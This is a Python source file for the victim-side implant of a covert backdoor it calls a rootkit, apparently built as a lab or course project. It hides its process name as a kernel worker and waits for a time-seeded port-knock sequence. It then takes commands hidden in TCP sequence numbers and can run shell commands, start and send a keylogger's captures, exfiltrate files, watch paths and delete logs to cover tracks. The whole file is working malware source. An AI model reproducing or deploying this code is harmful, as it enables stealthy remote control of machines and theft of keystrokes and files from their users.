#!/usr/bin/env python3
import os
import sys
import time
import socket
import struct
import random
import threading
import subprocess
from scapy.all import IP, TCP, sniff, send

# Import Keylogger from the provided file
from keylogger import Keylogger

class Victim:
    def __init__(self):
        self.is_connected = False
        self.tx_port = None
        self.rx_port = None
        self.commander_ip = None
        self.session_lock = threading.Lock()
        self.keylogger = None
        self.keylogger_thread = None
        self.watcher_thread = None
        self.running = True
        self.command_buffer = ""
        self.keylogger_active = False  # Track keylogger state
        
        # Concealment: Change process name
        self.conceal_process()

    def conceal_process(self):
        """Attempts to conceal the process name."""
        try:
            sys.argv[0] = "[kworker/u]"
            try:
                import prctl
                prctl.set_name("[kworker/u]")
                print("[*] Process concealed using prctl")
            except ImportError:
                print("[*] Process name concealed (argv[0] only)")
        except Exception as e:
            print(f"[!] Concealment limited: {e}")

    def _generate_expected_sequence(self, target_ip):
        """Replicates PortKnocker logic to validate the knock sequence."""
        try:
            ip_u32 = struct.unpack("!I", socket.inet_aton(target_ip))[0]
        except socket.error:
            return None

        time_step = int(time.time() / 60)
        seed = ip_u32 ^ time_step
        rng = random.Random(seed)

        knocks = rng.sample(range(1024, 65535), 3)
        
        tx_port = None
        rx_port = None
        while True:
            tx_port = rng.randint(1024, 65535)
            rx_port = rng.randint(1024, 65535)
            if (tx_port not in knocks and rx_port not in knocks and tx_port != rx_port):
                break
        
        return knocks, tx_port, rx_port

    def wait_for_knock(self):
        """Sniffs for the port knock sequence to initiate session."""
        print("[*] Waiting for port knock sequence...")
        print("[*] Process concealed. Waiting for commander...")
        
        self.knock_state = 0
        self.expected_knocks = []
        self.temp_tx = None
        self.temp_rx = None
        self.knock_source_ip = None
        self.last_knock_time = 0
        
        def process_knock(pkt):
            if not pkt.haslayer(IP) or not pkt.haslayer(TCP):
                return False
            
            if not pkt[TCP].flags & 0x02:
                return False
            
            dport = pkt[TCP].dport
            src_ip = pkt[IP].src
            victim_ip = pkt[IP].dst
            
            current_time = time.time()
            if current_time - self.last_knock_time > 30:
                if self.knock_state > 0:
                    print(f"[!] Timeout - resetting knock sequence")
                self.knock_state = 0
                self.expected_knocks = []
            
            self.last_knock_time = current_time
            
            if not self.expected_knocks:
                res = self._generate_expected_sequence(victim_ip)
                if res:
                    self.expected_knocks, self.temp_tx, self.temp_rx = res
                    print(f"[*] Expected ports: {self.expected_knocks}")
                else:
                    return False

            if dport == self.expected_knocks[self.knock_state]:
                self.knock_state += 1
                self.knock_source_ip = src_ip
                print(f"[*] Knock {self.knock_state}/3 on port {dport}")
                
                if self.knock_state >= 3:
                    self.commander_ip = src_ip
                    self.tx_port = self.temp_tx
                    self.rx_port = self.temp_rx
                    self.is_connected = True
                    print(f"\n[+] Session Established with {self.commander_ip}")
                    print(f"[+] Covert Ports: TX={self.tx_port}, RX={self.rx_port}")
                    return True
            else:
                if self.knock_state > 0:
                    print(f"[!] Wrong port {dport}. Resetting.")
                    self.knock_state = 0
            
            return False

        sniff(
            filter="tcp[tcpflags] & tcp-syn != 0", 
            prn=process_knock, 
            stop_filter=lambda x: self.is_connected,
            store=0
        )

    def send_covert_response(self, message):
        """Sends data back to Commander using TCP Sequence Numbers."""
        if not self.commander_ip or not self.rx_port:
            return
            
        for char in message:
            try:
                pkt = IP(dst=self.commander_ip)/TCP(
                    sport=self.tx_port, 
                    dport=self.rx_port, 
                    seq=ord(char), 
                    flags="A"
                )
                send(pkt, verbose=False)
                time.sleep(0.01)
            except Exception as e:
                print(f"[!] Error sending packet: {e}")
                break

    def command_listener(self):
        """Listens for covert commands on tx_port."""
        def process_packet(pkt):
            if pkt.haslayer(TCP) and pkt[TCP].dport == self.tx_port:
                char_code = pkt[TCP].seq % 256
                if char_code == 0:
                    self.handle_command(self.command_buffer)
                    self.command_buffer = ""
                else:
                    self.command_buffer += chr(char_code)
        
        while self.running:
            try:
                sniff(filter=f"tcp dst port {self.tx_port}", 
                      prn=process_packet, 
                      timeout=2, 
                      count=0,
                      store=0)
            except Exception as e:
                if self.running:
                    print(f"[!] Sniffer error: {e}")
                pass

    def handle_command(self, raw_cmd):
        """Parses and executes commands received from Commander."""
        if not raw_cmd:
            return
            
        parts = raw_cmd.split(":", 1)
        cmd_type = parts[0]
        data = parts[1] if len(parts) > 1 else ""

        print(f"[*] Command: {cmd_type}")

        if cmd_type == "EXIT":
            self.send_covert_response("Session terminated.\n")
            self.running = False
            os._exit(0)
            
        elif cmd_type == "START_KEY":
            self.start_keylogger()
            
        elif cmd_type == "STOP_KEY":
            self.stop_keylogger()
            
        elif cmd_type == "GET_LOG":
            self.send_keylog()
            
        elif cmd_type == "EXEC":
            self.execute_command(data)
            
        elif cmd_type == "GET":
            self.transfer_file_to_commander(data)
            
        elif cmd_type == "PUT":
            self.receive_file(data)
            
        elif cmd_type == "WATCH":
            self.start_watcher(data)
            self.send_covert_response(f"Watching {data}...\n")
            
        elif cmd_type == "UNINSTALL":
            self.uninstall()

    def start_keylogger(self):
        """Start the keylogger in a background thread."""
        if self.keylogger_active:
            self.send_covert_response("Keylogger already running.\n")
            return
            
        try:
            self.keylogger = Keylogger(log_path="./data/captured_keys.txt")
            self.keylogger_thread = threading.Thread(
                target=self.keylogger.run, 
                daemon=True
            )
            self.keylogger_thread.start()
            self.keylogger_active = True
            self.send_covert_response("Keylogger started.\n")
            print("[*] Keylogger thread started")
        except Exception as e:
            self.send_covert_response(f"Keylogger error: {e}\n")
            print(f"[!] Keylogger error: {e}")

    def stop_keylogger(self):
        """Stop the keylogger and delete the log file."""
        if not self.keylogger_active:
            self.send_covert_response("Keylogger not running.\n")
            print("[*] No keylogger thread running")
            return
        
        # Stop tracking (thread is daemon, will stop when main exits)
        self.keylogger_active = False
        self.keylogger_thread = None
        
        # Delete the log file to cover tracks
        log_path = "./data/captured_keys.txt"
        try:
            if os.path.exists(log_path):
                os.remove(log_path)
                print(f"[*] Keylog file deleted: {log_path}")
                self.send_covert_response("Keylogger stopped. Log deleted.\n")
            else:
                self.send_covert_response("Keylogger stopped. No log file found.\n")
        except Exception as e:
            print(f"[!] Error deleting log file: {e}")
            self.send_covert_response(f"Error deleting log: {e}\n")
        
        print("[*] Keylogger thread stopped")

    def send_keylog(self):
        """Send the keylog file contents to commander."""
        log_path = "./data/captured_keys.txt"
        
        if os.path.exists(log_path):
            try:
                with open(log_path, "r") as f:
                    content = f.read()
                
                if content:
                    self.send_covert_response("=== KEYLOG START ===\n")
                    self.send_covert_response(content)
                    self.send_covert_response("=== KEYLOG END ===\n")
                else:
                    self.send_covert_response("Keylog file is empty.\n")
            except Exception as e:
                self.send_covert_response(f"Error reading log: {e}\n")
        else:
            self.send_covert_response("No log file found. Start keylogger first.\n")

    def execute_command(self, cmd):
        """Execute a shell command and send output back."""
        try:
            result = subprocess.run(
                cmd, 
                shell=True, 
                capture_output=True, 
                text=True, 
                timeout=30
            )
            output = result.stdout + result.stderr
            if not output:
                output = "Command executed (no output).\n"
            self.send_covert_response(output)
        except subprocess.TimeoutExpired:
            self.send_covert_response("Command timed out (30s limit).\n")
        except Exception as e:
            self.send_covert_response(f"Execution Error: {str(e)}\n")

    def transfer_file_to_commander(self, filename):
        """Send a file from victim to commander."""
        try:
            if os.path.exists(filename):
                with open(filename, "r") as f:
                    content = f.read()
                
                self.send_covert_response(f"=== FILE: {filename} ===\n")
                self.send_covert_response(content)
                self.send_covert_response("=== TRANSFER COMPLETE ===\n")
            else:
                self.send_covert_response(f"Error: File {filename} not found.\n")
        except Exception as e:
            self.send_covert_response(f"Error: {str(e)}\n")

    def receive_file(self, filename):
        """Prepare to receive a file from commander."""
        try:
            dir_path = os.path.dirname(filename)
            if dir_path:
                os.makedirs(dir_path, exist_ok=True)
            
            with open(filename, "w") as f:
                pass
            
            self.send_covert_response(f"File {filename} created.\n")
            print(f"[*] File {filename} ready for data")
        except Exception as e:
            self.send_covert_response(f"Error creating file: {str(e)}\n")

    def start_watcher(self, path):
        """Watch a file or directory for changes."""
        def watch_loop():
            last_stat = None
            while self.running and self.is_connected:
                try:
                    if os.path.exists(path):
                        stat = os.stat(path)
                        if last_stat and stat.st_mtime != last_stat.st_mtime:
                            msg = f"[CHANGE DETECTED] {path}\n"
                            self.send_covert_response(msg)
                        last_stat = stat
                    else:
                        if last_stat:
                            self.send_covert_response(f"[DELETED] {path}\n")
                            last_stat = None
                    time.sleep(5)
                except Exception:
                    pass
        
        self.watcher_thread = threading.Thread(target=watch_loop, daemon=True)
        self.watcher_thread.start()
        print(f"[*] Watching {path}")

    def uninstall(self):
        """Remove the rootkit."""
        self.send_covert_response("Uninstalling rootkit...\n")
        self.running = False
        
        # Remove keylog file
        try:
            log_path = "./data/captured_keys.txt"
            if os.path.exists(log_path):
                os.remove(log_path)
                print("[*] Keylog file removed")
        except Exception:
            pass
        
        print("[*] Rootkit uninstalled")
        os._exit(0)

    def run(self):
        """Main victim loop."""
        if os.geteuid() != 0:
            print("[!] WARNING: Root privileges recommended for keylogger and sniffing.")
            print("[!] Some features may not work without sudo.")
        
        print("[*] Victim starting...")
        print(f"[*] PID: {os.getpid()}")
        
        self.wait_for_knock()
        
        if self.is_connected:
            cmd_thread = threading.Thread(target=self.command_listener, daemon=True)
            cmd_thread.start()
            print("[*] Command listener started")
            
            try:
                while self.running:
                    time.sleep(1)
            except KeyboardInterrupt:
                print("\n[*] Victim stopping...")
                self.running = False
        else:
            print("[!] Session not established.")

if __name__ == "__main__":
    victim = Victim()
    victim.run()
